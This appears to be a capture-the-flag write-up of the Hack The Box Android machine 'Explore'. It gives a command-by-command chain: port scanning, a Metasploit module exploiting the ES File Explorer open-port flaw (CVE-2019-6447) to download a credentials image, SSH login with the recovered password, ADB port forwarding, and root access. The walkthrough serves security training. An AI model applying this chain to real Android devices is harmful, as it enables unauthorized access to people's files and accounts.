# Explore
## CVE
## Metasploit
## Android Studio
```bash

➜  ~ sudo vi /etc/hosts
Add:

10.10.10.247 explore.htb

➜  ~ rustscan -a explore.htb --ulimit 5000

PORT      STATE SERVICE      REASON
2222/tcp  open  EtherNetIP-1 syn-ack
36127/tcp open  unknown      syn-ack
59777/tcp open  unknown      syn-ack

➜  ~ mkdir ~/htb/Intro_to_Android_Exploitation/Explore
➜  ~ sudo nmap -sV -p- -T4 -oA ~/htb/Intro_to_Android_Exploitation/Explore -vv explore.htb

PORT      STATE    SERVICE REASON         VERSION
2222/tcp  open     ssh     syn-ack ttl 63 (protocol 2.0)
5555/tcp  filtered freeciv no-response
36127/tcp open     unknown syn-ack ttl 63
59777/tcp open     http    syn-ack ttl 63 Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older

➜  ~ sudo nmap -Pn -sU -T4 -p1-500 -vv explore.htb

PORT    STATE         SERVICE       REASON
47/udp  open|filtered ni-ftp        no-response
99/udp  open|filtered metagram      no-response
139/udp open|filtered netbios-ssn   no-response
140/udp open|filtered emfis-data    no-response
292/udp open|filtered unknown       no-response
301/udp open|filtered unknown       no-response
338/udp open|filtered unknown       no-response
357/udp open|filtered bhevent       no-response
384/udp open|filtered arns          no-response
404/udp open|filtered nced          no-response
416/udp open|filtered silverplatter no-response
433/udp open|filtered nnsp          no-response

GoogleFu:

port 59777

Response:

'ES File Explorer Open Port Vulnerability - CVE-2019-6447'


msf6 > search ES File Explorer 4.1.9.7.4 
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > show options
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set rhosts 10.10.10.247
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > run
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > show actions

   Name            Description
   ----            -----------
   APPLAUNCH       Launch an app. ACTIONITEM required.
   GETDEVICEINFO   Get device info
   GETFILE         Get a file from the device. ACTIONITEM required.
   LISTAPPS        List all the apps installed
   LISTAPPSALL     List all the apps installed
   LISTAPPSPHONE   List all the phone apps installed
   LISTAPPSSDCARD  List all the apk files stored on the sdcard
   LISTAPPSSYSTEM  List all the system apps installed
   LISTAUDIOS      List all the audio files
   LISTFILES       List all the files on the sdcard
   LISTPICS        List all the pictures
   LISTVIDEOS      List all the videos

msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set action LISTPICS
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > run
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > show actions
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set action GETFILE
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > run

[+] 10.10.10.247:59777   - /storage/emulated/0/DCIM/creds.jpg saved to /root/.msf4/loot/20220627081015_default_10.10.10.247_getFile_271181.jpg

➜  ~ sudo apt install install imagemagick
➜  ~ sudo display /root/.msf4/loot/20220627081015_default_10.10.10.247_getFile_271181.jpg
➜  ~ sudo cp /root/.msf4/loot/20220627081015_default_10.10.10.247_getFile_271181.jpg .

After realizing the picture was exceptionally large:

➜  ~ convert 20220627081015_default_10.10.10.247_getFile_271181.jpg -resize 300x300! new.jpg
➜  ~ display new.jpg 

Also needing rotation:

➜  ~ convert -rotate "90" new.jpg newer.jpg
➜  ~ display newer.jpg 

Alternatively,

➜  ~ convert 20220627081015_default_10.10.10.247_getFile_271181.jpg -resize 300x300! -rotate "90" new.jpg

Response:

Kr1sT!5h@Rp3xPl0r3!

Troubleshoot ssh connectivity issues w/ host:

➜  cd .ssh ; mkdir config ; chmod 600 config
➜  sudo vi config
Add:

Host explore.htb
    User kristi
    PubKeyAcceptedAlgorithms +ssh-rsa
    HostKeyAlgorithms +ssh-rsa

➜  ssh kr1st@explore.htb -p 2222

Alternatively,

➜  cat config

Host explore
    HostName explore.htb	
    User kristi
    PubKeyAcceptedAlgorithms +ssh-rsa
    HostKeyAlgorithms +ssh-rsa
    Port 2222

➜  ssh explore

Password authentication
(kristi@explore.htb) Password: 

:/ $ cd storage/emulated/0                                                     
:/storage/emulated/0 $ cat user.txt 

f32017174c7c7e8f50c6da52891ae250

Ctrl-C

➜  ssh -L 5555:localhost:5555 explore

Back on your local machine:

➜  tools adb connect localhost:5555
➜  tools adb shell
x86_64:/ $ su          
:/ # cat /storage/emulated/0/user.txt

f32017174c7c7e8f50c6da52891ae250

:/ # cat data/root.txt   

f04fc82b6d49b41c9b08982be59338c5

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627082333.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627082415.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627082450.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627082601.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627082644.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627082719.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627083418.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627082039.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627091438.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627090922.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627092620.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627090335.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627090621.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627091235.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220627091252.png)

#hacking
